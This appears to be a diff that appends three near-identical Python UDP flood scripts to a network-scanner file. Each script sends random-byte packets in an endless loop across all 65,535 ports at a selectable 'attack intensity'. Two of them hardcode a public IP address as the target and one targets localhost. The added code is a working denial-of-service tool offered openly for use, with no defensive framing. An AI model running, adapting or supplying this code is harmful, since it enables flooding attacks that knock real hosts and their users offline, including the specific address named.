@@ -16,3 +16,127 @@ def ip_scan(target_range):
 if __name__ == "__main__":
     target_range = input("Enter the target IP range (e.g., 192.168.1.0/24): ")
     ip_scan(target_range)
+
+
+
+_____________________________
+
+import socket
+import random
+import time
+
+# Target settings
+ip = '196.188.93.97'  # Target IP address
+port = 80          # Default target port
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+# Packet size
+packet_size = 1024
+packet_size = 1024
+packet_size = 5080
+packet_size = 10000
+packet_size = 8090
+
+bytes = random._urandom(packet_size)
+
+# Intensity settings
+intensity = input("Select attack intensity (1 = Slow, 2 = Medium, 3 = High): ")
+
+# Time delay based on intensity
+if intensity == '1':
+    delay = 0.005  # Slow
+elif intensity == '2':
+    delay = 0.0002  # Medium
+elif intensity == '3':
+    delay = 0.0 # High
+else:
+    print("Invalid input, setting to Medium by default.")
+    delay = 0.2
+
+# Port range
+start_port = 1
+end_port = 65535
+
+# Packet counter
+sent_packets = 0
+
+# Attack loop
+while True:
+    for port in range(start_port, end_port + 1):
+        sock.sendto(bytes, (ip, port))
+        sent_packets += 1
+        print(f"Sent: {sent_packets} | Attacking port {port} with intensity level: {intensity}")
+        time.sleep(delay)
+______________________^_^_______________
+import socket
+import random
+import time
+
+# Target settings
+ip = '127.0.0.1'  # Target IP address
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1024)
+
+# Intensity settings
+intensity = input("Select attack intensity (1 = Slow, 2 = Medium, 3 = High): ")
+
+# Time delay based on intensity
+if intensity == '1':
+    delay = 0.05  # Slow: Attack every 0.5 seconds
+elif intensity == '2':
+    delay = 0.002  # Medium: Attack every 0.2 seconds
+elif intensity == '3':
+    delay = 0.0005 # High: Attack every 0.05 seconds
+else:
+    print("Invalid input, setting to Medium by default.")
+    delay = 0.2
+
+# Port range settings
+start_port = 1
+end_port = 65535
+
+# Attack loop on all ports in range
+while True:
+    for port in range(start_port, end_port + 1):
+        sock.sendto(bytes, (ip, port))
+        print(f"Attacking port {port} with intensity level: {intensity}")
+        time.sleep(delay)  # Delay between attacks
+___________________<<________>>______
+import socket
+import random
+import time
+
+# Target settings
+ip = '196.188.93.97'  # Target IP address
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1024)
+
+# Intensity settings
+intensity = input("Select attack intensity (1 = Slow, 2 = Medium, 3 = High): ")
+
+# Time delay based on intensity
+if intensity == '1':
+    delay = 0.001 # Slow
+elif intensity == '2':
+    delay = 0.0002  # Medium
+elif intensity == '3':
+    delay = 0.00000 # High
+else:
+    print("Invalid input, setting to Medium by default.")
+    delay = 0.2
+
+# Port range
+start_port = 1
+end_port = 65535
+
+# Packet counter
+sent_packets = 0
+
+# Attack loop
+while True:
+    for port in range(start_port, end_port + 1):
+        sock.sendto(bytes, (ip, port))
+        sent_packets += 1
+        print(f"Sent: {sent_packets} | Attacking port {port} with intensity level: {intensity}")
+        time.sleep(delay)
+____________________________________
